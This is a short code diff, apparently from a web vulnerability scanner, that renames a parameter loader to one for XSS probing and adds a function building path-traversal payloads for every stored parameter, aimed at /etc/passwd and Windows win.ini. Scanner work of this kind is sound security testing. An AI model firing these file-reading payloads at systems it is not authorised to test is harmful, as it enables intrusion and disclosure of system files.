@@ -43,10 +43,7 @@ def load_html_urls_to_set(url):
 
     return result
 
-def load_parameters_to_set(url):
-    """
-    Loads all parameters key=value related to the subdomain and returns them in a set.
-    """
+def load_xss_parameters_to_set(url):
     web_app = WebApplication.objects.get(url=url)
 
     parameters = Parameter.objects.filter(endpoint__web_app=web_app)
@@ -55,5 +52,23 @@ def load_parameters_to_set(url):
 
     for p in parameters:
         result.add(f'{p.key}="websploit"')
+
+    return result
+
+def load_path_traversal_parameters_to_set(url):
+    web_app = WebApplication.objects.get(url=url)
+
+    parameters = Parameter.objects.filter(endpoint__web_app=web_app)
+
+    result = set()
+
+    for p in parameters:
+        result.add(f'{p.key}=/etc/passwd')
+        result.add(f'{p.key}=../../../../../../../../../etc/passwd')
+        result.add(f'{p.key}=\\Windows\\win.ini')
+        result.add(f'{p.key}=..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini')
+
+
+
 
     return result
